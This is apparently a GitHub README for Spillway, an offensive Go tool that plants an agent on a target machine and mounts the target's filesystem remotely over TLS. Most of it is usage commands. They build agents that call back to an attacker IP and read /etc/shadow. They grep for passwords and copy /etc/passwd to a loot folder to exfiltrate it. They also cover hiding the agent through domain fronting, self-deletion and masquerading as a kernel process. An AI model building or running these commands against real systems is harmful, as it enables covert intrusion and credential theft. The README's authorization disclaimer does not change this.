<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Spillway/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Spillway/main/docs/assets/logo-light.svg">
  <img alt="Spillway" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Spillway/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Go](https://img.shields.io/badge/language-Go-00ADD8.svg)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Reverse/bind/dormant FUSE filesystem mount for penetration testing.**

Deploy a small agent on the target, mount its entire filesystem locally via FUSE, and browse with standard tools — over TLS 1.3 with mutual PSK authentication. SSHFS without SSH, built for offense.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal.

</div>

---

## Quick Start

**Prerequisites:** Go 1.22+, FUSE (`libfuse` on Linux, macFUSE on macOS)

```bash
git clone https://github.com/Real-Fruit-Snacks/Spillway.git
cd Spillway
make listener
./build.sh reverse 10.10.14.5:443
```

**Verify:**

```bash
# Start listener (attacker)
./bin/spillway listen --port 443 --mount ./target --key $(cat .psk)

# Deploy agent on target (zero args — config baked at compile time)
./spillway-agent-linux-amd64

# Browse the remote filesystem with any tool
ls ./target/etc/
cat ./target/etc/shadow
grep -r "password" ./target/var/www/
```

---

## Features

### Reverse / Bind / Dormant Modes

Three connection strategies. Agent calls back (reverse), listens (bind), or sits silent until an authenticated knock triggers a callback (dormant). All over TLS 1.3.

```bash
./build.sh reverse 10.10.14.5:443           # agent dials back
./build.sh bind 0.0.0.0:8443                # agent listens
./build.sh dormant 10.10.14.5:443 --knock-port 49152  # silent until knock
```

### Full FUSE Mount

Real mountpoint on your machine. `ls`, `cat`, `cp`, `grep`, `find`, `vim` — any tool that reads files works transparently against the remote filesystem. 17 operations mapped through FUSE.

```bash
ls ./target/                          # directory listing
cat ./target/etc/shadow               # read files
grep -r "password" ./target/etc/      # search content
find ./target/ -perm -4000            # find SUID binaries
cp ./target/etc/passwd ./loot/        # exfiltrate
```

### TLS 1.3 + PSK Auth

Ephemeral self-signed ECDSA certificates with optional fingerprint pinning. Two-round HMAC-SHA256 challenge-response authentication — both sides prove key possession before any filesystem operations begin.

```bash
./build.sh reverse 10.10.14.5:443 --key <base64-psk>
./build.sh reverse 10.10.14.5:443 --sni cdn.example.com  # domain fronting
```

### Agent Deployment

Zero runtime arguments. All configuration injected via `-ldflags` at compile time — nothing in `/proc/cmdline`. Static binary, cross-compiled for 5 platform targets.

```bash
./build.sh reverse 10.10.14.5:443 --all          # build all 5 platforms
./build.sh reverse 10.10.14.5:443 --self-delete   # remove binary after exec
./build.sh reverse 10.10.14.5:443 --procname [kworker/0:1]  # masquerade
```

---

## Architecture

```
cmd/spillway/
├── main.go              # Entry point, mode dispatch
├── config.go            # Compile-time config vars (ldflags)
├── agent_run.go         # Agent mode (//go:build agent)
└── listener_run.go      # Listener CLI (//go:build !agent)

internal/
├── protocol/            # Wire format, message types, errno mapping
├── transport/           # TLS 1.3, framed conn, mux, proxy tunneling
├── agent/               # FS ops, path jail, rate limit, opsec
├── fuse/                # FUSE bridge, dir/file nodes, mount
├── listener/            # Connection accept, session lifecycle
├── cache/               # TTL cache (stat 5s, dir 5s)
└── config/              # Shared configuration types
```

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Spillway/security/advisories). 90-day responsible disclosure.

**Spillway does not:**
- Manage implants, tasking, or beaconing (not a C2)
- Generate payloads or exploit modules (not a framework)
- Destroy evidence or tamper with logs (not anti-forensics)
- Evade EDR/XDR behavioral analysis (not evasion tooling)

---

## License

[MIT](LICENSE) — Copyright 2026 Real-Fruit-Snacks
